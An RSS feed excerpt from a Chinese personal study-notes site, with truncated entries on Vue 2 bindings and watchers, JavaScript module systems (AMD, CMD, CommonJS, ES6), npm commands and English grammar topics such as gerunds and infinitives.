      <title>Vue Class 与 Style 绑定</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/class-%E4%B8%8E-style-%E7%BB%91%E5%AE%9A/</link>
      <pubDate>Wed, 18 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/class-%E4%B8%8E-style-%E7%BB%91%E5%AE%9A/</guid>
      <description>Class 与 Style 绑定 绑定 Class 字符串 适合场景：类名不确定，且需要要动态获取。
对象 适合场景：要绑定多个类名，类名个数确定，类名也确定，但需要动态决定是否要应用样式。
通过修改属性的布尔值来决定是否启用当前样式。
数组 适合场景：要绑定多个类名，类名个数不确定，类名也不确定。
通过向数组中添加元素来增加类名，删除元素来移除类名。
绑定内联样式 对象 CSS 属性名可以用小驼峰式或短横线分隔（用引号括起来）来命名。其中 CSS 属性指是动态值
HTML
&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34; /&amp;gt;  &amp;lt;script src=&amp;#34;https://cdn.bootcdn.net/ajax/libs/vue/2.6.9/vue.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;  &amp;lt;title&amp;gt;Vue&amp;lt;/title&amp;gt;  &amp;lt;style&amp;gt;  .basic {  width: 100px;  height: 100px;  margin-top: 10px;  border: 1px solid #000;  }   .</description>
    </item>
    
    <item>
      <title>Vue watch</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/watch/</link>
      <pubDate>Wed, 18 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/watch/</guid>
      <description>watch 侦听器，用于侦听 Vue 实例上的数据变动。
HTML
&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt; 	&amp;lt;head&amp;gt; 	&amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt; 	&amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt; 	&amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34; /&amp;gt; 	&amp;lt;script src=&amp;#34;https://cdn.bootcdn.net/ajax/libs/vue/2.6.9/vue.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; 	&amp;lt;title&amp;gt;Vue&amp;lt;/title&amp;gt; 	&amp;lt;style&amp;gt;&amp;lt;/style&amp;gt; 	&amp;lt;/head&amp;gt;  	&amp;lt;body&amp;gt; 	&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt; 	&amp;lt;h2&amp;gt;今天天气很{{weather}}&amp;lt;/h2&amp;gt; 	&amp;lt;button @click=&amp;#34;handoff&amp;#34;&amp;gt;切换天气&amp;lt;/button&amp;gt; 	&amp;lt;h2&amp;gt;{{number.a}}&amp;lt;/h2&amp;gt; 	&amp;lt;button @click=&amp;#34;number.a++&amp;#34;&amp;gt;深度监听a&amp;lt;/button&amp;gt; 	&amp;lt;h2&amp;gt;{{number.b}}&amp;lt;/h2&amp;gt; 	&amp;lt;button @click=&amp;#34;number.b++&amp;#34;&amp;gt;深度监听b&amp;lt;/button&amp;gt; 	&amp;lt;/div&amp;gt; 	&amp;lt;/body&amp;gt; 	&amp;lt;script src=&amp;#34;./js/main.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; &amp;lt;/html&amp;gt; JavaScript
var vm = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	isHot: true, 	number: { 	a: 1, 	b: 2, 	}, 	}, 	computed: { 	weather() { 	return this.</description>
    </item>
    
    <item>
      <title>Vue 过滤与排序</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93/%E8%BF%87%E6%BB%A4%E4%B8%8E%E6%8E%92%E5%BA%8F/</link>
      <pubDate>Wed, 18 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93/%E8%BF%87%E6%BB%A4%E4%B8%8E%E6%8E%92%E5%BA%8F/</guid>
      <description>过滤与排序 当用computed和watch都能实现某一个功能的时候，优先使用computed。
过滤 分别用两种方式实现过滤，computed 与watch，推荐使用前者。
HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt; 	&amp;lt;h1&amp;gt;模糊搜索&amp;lt;/h1&amp;gt; 	&amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;&amp;#34; id=&amp;#34;&amp;#34; placeholder=&amp;#34;请输入名字&amp;#34; v-model=&amp;#34;keyWord&amp;#34; /&amp;gt; 	&amp;lt;ul&amp;gt; 	&amp;lt;li v-for=&amp;#34;p in filterPersons&amp;#34; :key=&amp;#34;p.id&amp;#34;&amp;gt;{{p.name}}-{{p.age}}-{{p.sex}}&amp;lt;/li&amp;gt; 	&amp;lt;/ul&amp;gt; &amp;lt;/div&amp;gt; JavaScrip
watch 实现
var vm = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	keyWord: &amp;#39;&amp;#39;, 	persons: [ 	{ id: &amp;#39;001&amp;#39;, name: &amp;#39;马冬梅&amp;#39;, age: 20, sex: &amp;#39;女&amp;#39; }, 	{ id: &amp;#39;002&amp;#39;, name: &amp;#39;周冬雨&amp;#39;, age: 21, sex: &amp;#39;女&amp;#39; }, 	{ id: &amp;#39;003&amp;#39;, name: &amp;#39;周杰伦 &amp;#39;, age: 22, sex: &amp;#39;男&amp;#39; }, 	{ id: &amp;#39;004&amp;#39;, name: &amp;#39;温兆伦 &amp;#39;, age: 18, sex: &amp;#39;男&amp;#39; }, 	], 	// 用来接受过滤后的结果 	filterPersons: [], 	}, 	methods: {}, 	watch: { 	keyWord: { 	// 初始化 filterPersons 数组 	immediate: true, 	handler(val) { 	// 将过滤后的结果赋给 persons 	this.</description>
    </item>
    
    <item>
      <title>Echarts</title>
      <link>https://note.yxzi.xyz/note/technology/storehouse/echarts/echarts/</link>
      <pubDate>Mon, 16 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/storehouse/echarts/echarts/</guid>
      <description>Echarts ECharts 是一个使用 JavaScript 实现的开源可视化库，兼容性强，底层依赖矢量图形库 ZRender，提供直观，交互丰富，可高度个性化定制的数据可视化图表。
使用 Echarts 的时候，只需要更改配置项即可。</description>
    </item>
    
    <item>
      <title>English 非谓语动词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E9%9D%9E%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E9%9D%9E%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/</link>
      <pubDate>Mon, 16 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E9%9D%9E%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E9%9D%9E%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/</guid>
      <description>非谓语动词 谓语动词不能作除谓语以外的句子成分，如果想作除谓语以外的句子成分，只能使用非谓语动词。
以外的所有句子成分和所有从句，从而简化句子，只不过这样的非谓语动词就无法表示时体气等作用了</description>
    </item>
    
    <item>
      <title>jQuery</title>
      <link>https://note.yxzi.xyz/note/technology/storehouse/jquery/jquery/</link>
      <pubDate>Mon, 16 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/storehouse/jquery/jquery/</guid>
      <description>jQuery jQuery 是一个 JavaScript 的类库，jQuery 有的 JavaScript 都有，两者的区别在于用 jQuery 写的代码量更少且功能更大。</description>
    </item>
    
    <item>
      <title>Uniq</title>
      <link>https://note.yxzi.xyz/note/technology/storehouse/uniq/uniq/</link>
      <pubDate>Mon, 16 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/storehouse/uniq/uniq/</guid>
      <description>Uniq ‎ 用于将数组中的所有重复项删除，并按数组中每个元素的首位字符进行升序
安装 npm install uniq 使用
// 导入 uniq var uniq = require(&amp;#39;uniq&amp;#39;); // 定义数组 var arr = [199, 9, 3]; // 排序 var result = uniq(arr); // [ 199, 3, 9 ] // 虽然 199 大于 3 和 9，但因为 199 的首位字符为 1，因此，它排在l console.log(result); </description>
    </item>
    
    <item>
      <title>English 动名词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E9%9D%9E%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E5%8A%A8%E5%90%8D%E8%AF%8D/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E9%9D%9E%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E5%8A%A8%E5%90%8D%E8%AF%8D/</guid>
      <description>动名词 它长得与谓语动词的进行状态一样，用来作主语，由动词 + ing 构成。
动名词和现在分词一样，区别在于现在分词作谓语，动名词不能作谓语。
 She is eating an apple. Eating is importtant. writing diaries. My job is teaching English. My hobby is playing basketball.  动名词用于表示抽象的、多次的、泛指动作。
 His job is selling houses.（多次） Smoking is not good for us.（多次）  can not help + 动名词：忍不住</description>
    </item>
    
    <item>
      <title>English 动词不定式</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E9%9D%9E%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E5%8A%A8%E8%AF%8D%E4%B8%8D%E5%AE%9A%E5%BC%8F/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E9%9D%9E%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E5%8A%A8%E8%AF%8D%E4%B8%8D%E5%AE%9A%E5%BC%8F/</guid>
      <description>动词不定式 它长得与谓语动词原形一样，由 to + 动词原型构成。其中 to 只是一个符号，用于与谓语动词作区分。可以作主语。
不能单独作谓语。
 To be believe us I want to be beautiful. To work every night. To master English is easy. To get there by bike took me two hours. It is necessary for an adult to learn English grammer. It is kind of you to repair my bike.  通常动词不定式作主语会显得句子头重脚轻，因此，我们可以将句子变化以下，将主语移动到句子后面，前面用一个 it 来充当形式主语：
 To help poor people is our duty. it is our duty to help poor people.</description>
    </item>
    
    <item>
      <title>English 现在分词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E9%9D%9E%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E7%8E%B0%E5%9C%A8%E5%88%86%E8%AF%8D/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E9%9D%9E%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E7%8E%B0%E5%9C%A8%E5%88%86%E8%AF%8D/</guid>
      <description>现在分词 它长得与谓语动词的进行状态一样。
现在分词必须构成进行时态，且前面必须有助动词。</description>
    </item>
    
    <item>
      <title>English 谓语动词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/</guid>
      <description>谓语动词 它是只能作谓语，用于表达动作的时间、状态、语气、否定、可能性、必须性等，但想发挥这些作用，需要用到助动词。</description>
    </item>
    
    <item>
      <title>English 过去分词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E9%9D%9E%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E8%BF%87%E5%8E%BB%E5%88%86%E8%AF%8D/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E9%9D%9E%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E8%BF%87%E5%8E%BB%E5%88%86%E8%AF%8D/</guid>
      <description>过去分词 它长得与谓语动词的完成状态一样。</description>
    </item>
    
    <item>
      <title>JavaScrip AMD</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/amd/amd/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/amd/amd/</guid>
      <description>AMD 专门用于浏览器端，实现异步加载模块，该规范依赖于 require.js。
不是所有模块都支持 AMD 规范，比如 angular.js，但也可以通过 shim配置来使用angular.js
定义模块 定义没有依赖的模块：
define(function () { 	// 暴露模块 	return module; }); 定义有依赖的模块：
// 显式声明依赖注入 define([&amp;#39;module1&amp;#39;, &amp;#39;module2&amp;#39;, &amp;#39;module2&amp;#39;], function (m1Obj, m2Obj, m3Obj) { 	// 暴露模块 	return module; }); 导入模块 require([ 	&amp;#39;module1&amp;#39;, 	&amp;#39;module2&amp;#39;, 	&amp;#39;module3&amp;#39;, 	function (m1Obj, m2Obj, m3Obj) { 	// 使用 m1Obj, m2Obj, m3Obj 	}, ]); 实现 使用require.js。</description>
    </item>
    
    <item>
      <title>JavaScrip AMD 实现模块化</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/amd/amd-%E5%AE%9E%E7%8E%B0%E6%A8%A1%E5%9D%97%E5%8C%96/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/amd/amd-%E5%AE%9E%E7%8E%B0%E6%A8%A1%E5%9D%97%E5%8C%96/</guid>
      <description>AMD 实现模块化 将require.js导入到项目目录./libs/require.js
创建项目结构 ./libs/：第三方模块目录。
./modules/：自定义模块目录。
./libs/jquery.js：第三方模块。
./libs/require.js：第三方模块。
./modules/alerter.js：有依赖的自定义模块。
./modules/dataService.js无依赖的自定义模块。
./main.js：主模块。
./index.html：入口文件。
模块化编码 alerter.js
// 定义无依赖的模块 define(function () { 	var name = &amp;#39;no have dependencies&amp;#39;; 	function fun() { 	return name; 	} 	// 暴露模块的 fun() 	return { fun }; }); dataService.js
// 定义有依赖的模块，该模块依赖 dataService、jquery define([&amp;#39;dataService&amp;#39;, &amp;#39;jquery&amp;#39;], function (dataService, $) { 	var msg = &amp;#39;have dependencies&amp;#39;; 	function showMsg() { 	console.log(msg, dataService.fun()); 	} 	$(&amp;#39;body&amp;#39;).</description>
    </item>
    
    <item>
      <title>JavaScrip Browserify 实现模块化</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/commonjs/browserify-%E5%AE%9E%E7%8E%B0%E6%A8%A1%E5%9D%97%E5%8C%96/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/commonjs/browserify-%E5%AE%9E%E7%8E%B0%E6%A8%A1%E5%9D%97%E5%8C%96/</guid>
      <description>Browserify 实现模块化 基于本地浏览器端实现模块化，需要用 Browserify来打包。
创建项目结构 ./dist：打包生成的文件目录。
./src：模块目录。
./src/module1.js：自定义模块一。
./src/module2.js：自定义模块二。
./src/module3.js：自定义模块三。
./app.js：主模块。
./index.html：入口文件。
模块化编码 module1.js
// 暴露对象 module.exports = { 	msg: &amp;#39;module one&amp;#39;, 	fun() { 	console.log(this.msg); 	}, }; module2.js
// 暴露函数 module.exports = function () { 	console.log(&amp;#39;module two&amp;#39;); }; module3.js
// 向暴露 2 个函数，1 个数组  exports.f = function () { 	console.log(&amp;#39;modul three f1&amp;#39;); };  exports.f2 = function () { 	console.log(&amp;#39;module three f2&amp;#39;); };  exports.</description>
    </item>
    
    <item>
      <title>JavaScrip CMD</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/cmd/cmd/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/cmd/cmd/</guid>
      <description>CMD 专用于浏览器端，异步加载模块。
惰性加载模块，即使用模块时才会加载。
实现该规范使用Sea.js
定义模块 注意，回调函数中的三个参数require, exports, module必须加上，否则会报错。
定义没有依赖的模块：
define(function (require, exports, module) { 	// 暴露模块，通常用后者 	exports.xxx = value; 	module.exports = value; }); 定义有依赖的模块：
define(function (require, exports, module) { 	// 同步导入模块 	var module2 = require(&amp;#39;./module2&amp;#39;); 	// 异步导入依赖模块 	require.async(&amp;#39;./module3&amp;#39;, function (m3Obj) { 	// 使用 m3Obj 	}); 	// 暴露模块 	exports.xxx = value; }); 导入模块 define(function (require) { 	var m1 = require(&amp;#39;.</description>
    </item>
    
    <item>
      <title>JavaScrip CMD 实现模块化</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/cmd/cmd-%E5%AE%9E%E7%8E%B0%E6%A8%A1%E5%9D%97%E5%8C%96/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/cmd/cmd-%E5%AE%9E%E7%8E%B0%E6%A8%A1%E5%9D%97%E5%8C%96/</guid>
      <description>CMD 实现模块化 创建项目结构 ./libs：第三方模块目录。
./libs/sea.js：第三方模块。
./modules：自定义模块目录。
./modules/module1.js：自定义模块一。
./modules/module2.js：自定义模块二。
./modules/module3.js：自定义模块三。
./modules/module4.js：自定义模块四。
modules/main.js：主模块。
./index.html：入口文件
模块化编码 module1.js
// 定义没有依赖的模块 define(function (require, exports, module) { 	var msg = &amp;#39;module1&amp;#39;; 	function fun() { 	return msg; 	} 	// 暴露模块 	module.exports = { fun }; }); module2.js
// 定义没有依赖的模块 define(function (require, exports, module) { 	var msg = &amp;#39;module2&amp;#39;; 	function fun2() { 	console.log(msg); 	} 	// 暴露模块 	module.</description>
    </item>
    
    <item>
      <title>JavaScrip CommonJS</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/commonjs/commonjs/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/commonjs/commonjs/</guid>
      <description>CommonJS 一种为 JS 的表现指定的规范，它希望 JavaScrip 可以运行在任何地方，Node.js采用了这个规范。
一个单独文件就是一个模块，通过require()来同步加载要依赖的模块，然后通过extports或则module.exports来暴露模块的接口。
定义模块 两种方式所暴露的模块都是一个对象。
module.expots 将需要暴露的属性或方法保存到exports对象中。
// ExposedObjects() 将会保存到 exports 对象中，并暴露出去 module.expots = ExposedObjects(){ }; exports.xxx 给exports定义不同的xxx 对象，可以暴露不同属性或方法。
// 不同的对象暴露不同的方法或属性 expots.obj = ExposedObjects(){ }; expots.obj2 = ExposedObjects2(){ } expots.obj3 = ExposedObjects3(){ } 导入模块 // 导入第三方模块 require(&amp;#39;jquery&amp;#39;); // 导入自定义模块 require(&amp;#39;modules.js&amp;#39;); 实现 服务器端 直接使用 Node.js，加载模块时是同步加载，这会导致阻塞（等待），但因为是在服务器端，影响也不是很大，无非是加载的时间比较长。
浏览器端 加载模块时是同步加载，也会导致阻塞，且因为是在浏览器端，加载的时间非常长，用户体验不好（页面白屏），因此，我们需要将模块进行编译打包，以此来缩短加载时间。
打包工具：Browserify.</description>
    </item>
    
    <item>
      <title>JavaScrip ES6 Module</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/es6-module/es6-module/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/es6-module/es6-module/</guid>
      <description>ES6 Module 配置 package.json 项目或模块的描述文件。
{ 	&amp;#34;name&amp;#34;: &amp;#34;es6-module&amp;#34;, 	&amp;#34;version&amp;#34;: &amp;#34;1.0.0&amp;#34;, 	&amp;#34;dependencies&amp;#34;: { 	&amp;#34;jquery&amp;#34;: &amp;#34;^3.6.0&amp;#34;, 	&amp;#34;uniq&amp;#34;: &amp;#34;^1.0.1&amp;#34; 	}, 	&amp;#34;devDependencies&amp;#34;: { 	&amp;#34;@babel/cli&amp;#34;: &amp;#34;^7.17.10&amp;#34;, 	&amp;#34;@babel/core&amp;#34;: &amp;#34;^7.17.12&amp;#34;, 	&amp;#34;@babel/preset-env&amp;#34;: &amp;#34;^7.17.12&amp;#34;, 	&amp;#34;browserify&amp;#34;: &amp;#34;^17.0.0&amp;#34; 	} } 安装 babel/cli Babel 自带的一个内置的 CLI 命令行工具，可通过命令行编译文件。
npm install --save-dev @babel/core @babel/cli 其中@babel/core是 babel 的核心库。
babel/preset-env 一个智能预设，允许您使用最新的 JavaScript，而无需微观管理目标环境需要哪些语法转换（以及可选的浏览器 polyfills）
npm install --save-dev @babel/preset-env 安装 Browserify 用来打包编译模块。
npm install -g browserify 配置 babel.</description>
    </item>
    
    <item>
      <title>JavaScrip ES6 模块化规范</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/es6-module/es6-%E6%A8%A1%E5%9D%97%E5%8C%96%E8%A7%84%E8%8C%83/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/es6-module/es6-%E6%A8%A1%E5%9D%97%E5%8C%96%E8%A7%84%E8%8C%83/</guid>
      <description>ES6 模块化规范 在 ES6 之前，社区制定了一些模块加载方案，最主要的有 CommonJS 和 AMD 两种。前者用于服务器，后者用于浏览器。
ES6 在语言标准的层面上，实现了模块功能，而且实现得相当简单，完全可以取代 CommonJS 和 AMD 规范，成为浏览器和服务器通用的模块解决方案。
依赖模块需要借助 Browserify来打包。
暴露模块 使用export来暴露模块，它用于规定模块的对外接口。
分别暴露 export function fun1() { 	console.log(&amp;#39;fun1 module1&amp;#39;); } export function fun11() { 	console.log(&amp;#39;fun11 module1&amp;#39;); } export var arr = [9999, 34, 5, 6, 7565, 757, 6]; 统一暴露 function fun2() { 	console.log(&amp;#39;fun2 module2&amp;#39;); } function fun22() { 	console.log(&amp;#39;fun2 module2&amp;#39;); } export { fun2, fun22 }; 默认暴露 使用默认暴露，可以暴露任意数据类型；且暴露的是什么数据类型，接收到的就是什么数据类型；可以使用任意的变量来接收。
在同一个模块中，只允许用export default 暴露一次。</description>
    </item>
    
    <item>
      <title>JavaScrip NodeJs 实现模块化</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/commonjs/nodejs-%E5%AE%9E%E7%8E%B0%E6%A8%A1%E5%9D%97%E5%8C%96/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/commonjs/nodejs-%E5%AE%9E%E7%8E%B0%E6%A8%A1%E5%9D%97%E5%8C%96/</guid>
      <description>NodeJs 实现模块化 基于node.js服务器端实现模块化。
创建项目结构 ./modules：模块目录。
./modules/module1.js：自定义模块一。
./modules/module2.js：自定义模块二。
./modules/module3.js：自定义模块三。
./app.js：主模块。
安装模块 安装 uniq
npm install uniq 模块化编码 module1.js
// 暴露对象 module.exports = { 	msg: &amp;#39;module one&amp;#39;, 	fun() { 	console.log(this.msg); 	}, }; module2.js
// 暴露函数 module.exports = function () { 	console.log(&amp;#39;module two&amp;#39;); }; module3.js
// 暴露 2 个函数，1 个数组 exports.f = function () { 	console.log(&amp;#39;modul three f1&amp;#39;); };  exports.f2 = function () { 	console.log(&amp;#39;module three f2&amp;#39;); };  exports.</description>
    </item>
    
    <item>
      <title>JavaScrip 模块</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/%E6%A8%A1%E5%9D%97/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/%E6%A8%A1%E5%9D%97/</guid>
      <description>模块 向外提供特定功能的 JavaScrip 文件，一个 JavaScrip 文件就是一个模块。</description>
    </item>
    
    <item>
      <title>JavaScrip 模块化</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/%E6%A8%A1%E5%9D%97%E5%8C%96/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/%E6%A8%A1%E5%9D%97%E5%8C%96/</guid>
      <description>模块化 将一个复杂的 JavaScrip 程序依据一定的规范封装成几个块（文件），并组合在一起的过程就是模块化。块的内部数据是私有的，只向外部暴露了一些接口与外部其他模块通信。
作用  降低复杂度。 提高解耦性，降低耦合度。 部署方便，功能点明确。  优点  避免变量污染。 更好的分离，按需加载。 更高的复用性。 更高的可维护性。  常见的模块化标准 CommonJS.
ES6 Module.
AMD.
CMD.</description>
    </item>
    
    <item>
      <title>JavaScrip 模块化的发展史</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/%E6%A8%A1%E5%9D%97%E5%8C%96%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/%E6%A8%A1%E5%9D%97%E5%8C%96%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2/</guid>
      <description>模块化的发展史 全局函数模式 将不同的函数封装成不同的全局函数。
缺点
变量非常不安全，会直接污染全局中的变量。
JavaScrip One
// msg 变量并不安全，会被其他文件中的 js 代码修改。 var msg = &amp;#39;全局函数模式&amp;#39;; function fun() { 	console.log(msg); } JavaScrip Two
fun(); msg = &amp;#39;全局中的 msg 被其他文件中的 js 代码修改了&amp;#39;; fun(); 命名空间 将全局中的变量定义到一个对象中，以减少 Global 上的变量。
缺点
本质是对象，依旧可以通过对象去修改该对象中的变量，变量依旧不安全。
JavaScrip One
var obj = { 	// 将全局中的变量定义为对象的属性，以减少全局中的变量 	msg: &amp;#39;命名空间模式&amp;#39;, 	fun() { 	console.log(this.msg); 	}, }; JavaScrip Two
obj.fun(); obj.msg = &amp;#39;对象中的 msg 被其他文件中的 js 代码修改了&amp;#39;; obj.fun(); IIFE 模式 将变量和函数定义到立即执行函数内部，并将方法暴露给 window，以一个匿名闭包（将一个模块暴露给 window 对象，然后在其其他模块中用 window 对象来访问这个这个模块）的方式实现了模块化。</description>
    </item>
    
    <item>
      <title>npm config</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-config/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-config/</guid>
      <description>npm config npm config get registry 查看源地址
npm config set registry 设置源地址</description>
    </item>
    
    <item>
      <title>npm init</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-init/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
